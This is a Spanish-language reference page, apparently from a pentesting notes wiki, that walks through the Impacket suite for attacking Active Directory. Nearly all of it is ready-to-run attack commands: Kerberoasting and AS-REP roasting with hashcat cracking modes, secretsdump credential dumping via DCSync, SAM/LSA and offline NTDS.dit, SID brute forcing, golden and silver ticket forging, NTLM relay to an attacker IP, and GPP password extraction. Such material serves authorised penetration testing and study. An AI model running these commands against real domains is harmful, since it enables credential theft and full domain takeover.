---
title: Suite Impacket
resumen: Colección de scripts en Python para hablar todos los protocolos de AD directamente (Kerberos, SMB, LDAP, DRSUAPI...).
tags: swiss-army-knife
---

Impacket no es una sola herramienta sino una colección de scripts (`impacket-*`) que implementan directamente los protocolos de red de Windows/AD. Aquí se agrupan los más usados en esta web.

## GetUserSPNs — Kerberoasting

Obtiene los **tickets de servicio cifrados (TGS)** de cuentas con SPN.

```bash
impacket-GetUserSPNs domain.local/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt
```

Crackeo posterior con `hashcat -m 13100` o `john --format=krb5tgs`.

## GetNPUsers — AS-REP Roasting

Solicita el AS-REP de cuentas sin preautenticación, sin necesitar credenciales.

```bash
impacket-GetNPUsers 'dominio.local/' -no-pass -usersfile domain_users.txt -outputfile asrep_hashes.txt -dc-ip DC_IP
```

Crackeo posterior con `hashcat -m 18200` o `john --format=krb5asrep`.

## secretsdump — dump de credenciales

Extracción remota o local. Según privilegios y contexto ejecuta uno de tres modos:

- **DCSync** (remoto): abusa de `DS-Replication-Get-Changes-All` vía DRSUAPI para pedir al DC una réplica de todos los hashes del dominio.
- **SAM + LSA dump** (remoto/local): hashes NTLM de cuentas locales vía registro y secretos LSA cacheados. Aquí encaja el abuso de **Backup Operators**.
- **NTDS.dit offline**: extrae hashes directamente del fichero de base de datos de AD junto al hive SYSTEM, sin tocar el DC en vivo (tras `ntdsutil`, VSS, o exfiltración directa).

```bash
# Con credenciales válidas
impacket-secretsdump 'domain.local/USER:PASSWORD'@10.10.10.10

# Con hash NTLM (PtH)
impacket-secretsdump 'domain.local/USER'@10.10.10.10 -hashes :NTHASH

# Con ticket Kerberos (PtT)
KRB5CCNAME=krb5cc impacket-secretsdump -k 'DOMINIO/user@IP_OBJETIVO'

# A partir de hives de registro exportados
impacket-secretsdump -sam registry.SAM.hive -system registry.SYSTEM.hive -security registry.SECURITY.hive LOCAL

# NTDS.dit offline (tras ntdsutil)
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```

## lookupsid — fuerza bruta de SIDs

Enumera usuarios/grupos/equipos recorriendo secuencialmente los RID sobre el SID base del dominio.

```bash
impacket-lookupsid 'dominio.local/USER:PASS'@IP     # con credenciales
impacket-lookupsid ""@ip -no-pass                    # sesión nula
impacket-lookupsid dominio.local/USER@IP -hashes hash # PtH
```

## ticketer — Golden / TGT falsificado

```bash
# Un solo DC
impacket-ticketer -domain dominio.local -nthash HASH_KRBTGT -domain-sid SID_DOMINIO -user-id 512 Administrator

# Forest (child -> parent), permisos de Enterprise Admins (grupo 519)
impacket-ticketer -domain child.dominio.corp -nthash HASH_KRBTGT_CHILD -domain-sid SID_CHILD \
  -groups 519 -extra-sid SID_PARENT-519,S-1-5-9 'Administrator'
```

## getST — Silver Ticket / TGS legítimo firmado

Requiere tener ya un TGT válido (por ejemplo, de un Golden Ticket).

```bash
impacket-getST -spn 'CIFS/dc01.dominio.corp' -k -no-pass dominio.corp/usuario -debug
```

> Si falla, probar con `-aesKey` y comprobar que los FQDN están en minúscula en `/etc/hosts`.

## ticketConverter — conversión de formato de tickets

Convierte entre `.kirbi` (Windows/Mimikatz/Rubeus) y `.ccache` (Linux/Impacket).

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

## ntlmrelayx — relay NTLM

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'comandoAinterpretar'

# Por IPv6, con soporte de túnel SOCKS (tras mitm6)
sudo impacket-ntlmrelayx -6 -wh IP_ATACANTE -t smb://IP_TARGET -socks -debug -smb2support
```

## Get-GPPPassword — contraseñas en GPP

```bash
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'                                  # NULL session
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'                # con credenciales
Get-GPPPassword.py -xmlfile '/ruta/a/Policy.xml' 'LOCAL'                         # archivo local
```

### Técnicas donde aparece

[[kerberoasting]] · [[asreproasting]] · [[dcsync]] · [[dump-credenciales-locales]] · [[pass-the-hash]] · [[pass-the-ticket]] · [[golden-ticket]] · [[silver-ticket]] · [[smb-relay]] · [[abuse-gpp]] · [[enumeracion-smb-rpc]]
